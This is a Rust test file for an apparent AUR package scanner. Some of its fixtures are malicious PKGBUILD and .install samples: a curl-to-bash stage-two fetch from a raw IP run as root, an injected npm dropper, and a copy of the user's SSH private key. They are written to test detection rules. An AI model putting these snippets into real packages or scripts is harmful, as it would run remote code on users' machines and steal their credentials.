use pastor_aur::{
    scanner::{HeuristicScanner, RuleSeverity},
    state::AurStateStore,
    trust::{TrustReport, TrustStatus},
};

#[test]
fn test_detect_2026_atomic_arch_npm_install_in_pkgbuild() {
    let malicious_pkgbuild = r#"
# Maintainer: Bad Actor <compromised@example.com>
pkgname=legit-app
pkgver=1.2.0
pkgrel=1
arch=('x86_64')
url="https://example.com/legit"
license=('GPL')
source=("$pkgname-$pkgver.tar.gz")
sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')

build() {
    cd "$pkgname-$pkgver"
    # Injected 2026 supply-chain dropper:
    npm install atomic-lockfile
    make
}

package() {
    cd "$pkgname-$pkgver"
    make DESTDIR="$pkgdir" install
}
"#;

    let findings = HeuristicScanner::scan_content("PKGBUILD", malicious_pkgbuild);
    assert!(!findings.is_empty(), "Scanner must detect npm install dropper in PKGBUILD");
    let npm_finding = findings.iter().find(|f| f.rule_id == "AUR-R001-NPM-BUN-DROPPER");
    assert!(npm_finding.is_some());
    assert_eq!(npm_finding.unwrap().severity, RuleSeverity::Critical);
}

#[test]
fn test_detect_2026_july_august_wave_install_hook_backdoor() {
    let malicious_install_hook = r#"
post_install() {
    # Benign looking task
    systemctl daemon-reload
    # Attack payload executed as root by pacman:
    curl -sSf http://185.220.101.5/stage2.sh | bash
}

post_upgrade() {
    post_install
}
"#;

    let findings = HeuristicScanner::scan_content(".install", malicious_install_hook);
    assert!(!findings.is_empty(), "Scanner must flag malicious .install hook");
    let pipe_finding = findings.iter().find(|f| f.rule_id == "AUR-R002-REMOTE-PIPE-EXEC");
    assert!(pipe_finding.is_some());
    assert_eq!(pipe_finding.unwrap().severity, RuleSeverity::Critical);

    let ip_finding = findings.iter().find(|f| f.rule_id == "AUR-R005-RAW-IP-TARGET");
    assert!(ip_finding.is_some());
    assert_eq!(ip_finding.unwrap().severity, RuleSeverity::High);
}

#[test]
fn test_detect_credential_harvesting_attempt() {
    let credential_stealer = r#"
build() {
    # Attempting to access developer secrets
    if [ -f "$HOME/.ssh/id_rsa" ]; then
        cat "$HOME/.ssh/id_rsa" > /tmp/.stolen
    fi
}
"#;

    let findings = HeuristicScanner::scan_content("PKGBUILD", credential_stealer);
    assert!(findings.iter().any(|f| f.rule_id == "AUR-R004-CREDENTIAL-HARVESTING"));
}

#[test]
fn test_clean_pkgbuild_passes_without_findings() {
    let clean_pkgbuild = r#"
# Maintainer: Arch User <user@example.com>
pkgname=simple-cli
pkgver=1.0.0
pkgrel=1
pkgdesc="A simple utility"
arch=('x86_64')
url="https://github.com/example/simple-cli"
license=('MIT')
depends=('glibc')
source=("$pkgname-$pkgver.tar.gz::https://github.com/example/simple-cli/archive/v$pkgver.tar.gz")
sha256sums=('ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad')

build() {
    cd "$pkgname-$pkgver"
    cargo build --release --locked
}

package() {
    cd "$pkgname-$pkgver"
    install -Dm755 target/release/simple-cli "$pkgdir/usr/bin/simple-cli"
}
"#;

    let findings = HeuristicScanner::scan_content("PKGBUILD", clean_pkgbuild);
    assert!(findings.is_empty(), "Clean PKGBUILD should not trigger any security warnings");
}

#[test]
fn test_maintainer_trust_reset_on_change() {
    let mut state = AurStateStore::default();
    let _ = state.record_installed("compromised-tool", "commit123", Some("original_dev"));

    // Check when maintainer is unchanged
    let report_unchanged = TrustReport::assess("compromised-tool", Some("original_dev"), &state);
    assert_eq!(
        report_unchanged.status,
        TrustStatus::UnchangedMaintainer {
            maintainer: "original_dev".to_string()
        }
    );
    assert!(!report_unchanged.is_review_required);

    // Check when maintainer changed to attacker
    let report_changed = TrustReport::assess("compromised-tool", Some("attacker_account"), &state);
    assert_eq!(
        report_changed.status,
        TrustStatus::MaintainerChanged {
            previous: "original_dev".to_string(),
            current: "attacker_account".to_string()
        }
    );
    assert!(report_changed.is_review_required, "Maintainer change must trigger strict review");

    // Check first install
    let report_first = TrustReport::assess("brand-new-pkg", Some("alice"), &state);
    assert_eq!(report_first.status, TrustStatus::FirstInstall);
    assert!(report_first.is_review_required);
}

#[test]
fn test_alpm_vercmp_ordering() {
    use pastor_aur::api::alpm_vercmp;
    // Newer version should compare greater
    assert!(alpm_vercmp("2.0.0-1", "1.9.9-1") > 0);
    assert!(alpm_vercmp("1.0.0-2", "1.0.0-1") > 0);
    assert!(alpm_vercmp("1.0.1b-1", "1.0.1a-1") > 0);

    // Identical version should compare equal
    assert_eq!(alpm_vercmp("1.0.0-1", "1.0.0-1"), 0);

    // Older version should compare less
    assert!(alpm_vercmp("1.0.0-1", "2.0.0-1") < 0);
    assert!(alpm_vercmp("1.0.0-1", "1.0.0-2") < 0);
}

#[test]
fn test_aur_rpc_multiinfo_parsing() {
    use pastor_aur::api::{rpc_pkg_to_package, AurRpcPackage};
    use pastor_core::package::PackageState;

    let json = r#"{
        "version": 5,
        "type": "multiinfo",
        "resultcount": 2,
        "results": [
            {
                "ID": 100,
                "Name": "pkg-a",
                "PackageBase": "pkg-a",
                "Version": "2.1.0-1",
                "Description": "Package A description",
                "URL": "https://example.com/pkg-a",
                "NumVotes": 50,
                "Popularity": 12.5,
                "Maintainer": "dev_a"
            },
            {
                "ID": 101,
                "Name": "pkg-b",
                "PackageBase": "pkg-b",
                "Version": "1.0.0-1",
                "Description": "Package B description",
                "URL": "https://example.com/pkg-b",
                "NumVotes": 10,
                "Popularity": 2.1,
                "Maintainer": "dev_b"
            }
        ]
    }"#;

    #[derive(serde::Deserialize)]
    struct TestResp {
        results: Vec<AurRpcPackage>,
    }

    let parsed: TestResp = serde_json::from_str(json).expect("valid multiinfo JSON");
    assert_eq!(parsed.results.len(), 2);

    // Package A: newer version available (installed is 2.0.0-1)
    let pkg_a = rpc_pkg_to_package(parsed.results[0].clone(), Some("2.0.0-1".to_string()));
    assert_eq!(pkg_a.state, PackageState::UpdateAvailable);
    assert_eq!(pkg_a.version, "2.1.0-1");
    assert_eq!(pkg_a.installed_version.as_deref(), Some("2.0.0-1"));

    // Package B: up to date (installed is 1.0.0-1)
    let pkg_b = rpc_pkg_to_package(parsed.results[1].clone(), Some("1.0.0-1".to_string()));
    assert_eq!(pkg_b.state, PackageState::Installed);
    assert_eq!(pkg_b.version, "1.0.0-1");
    assert_eq!(pkg_b.installed_version.as_deref(), Some("1.0.0-1"));
}

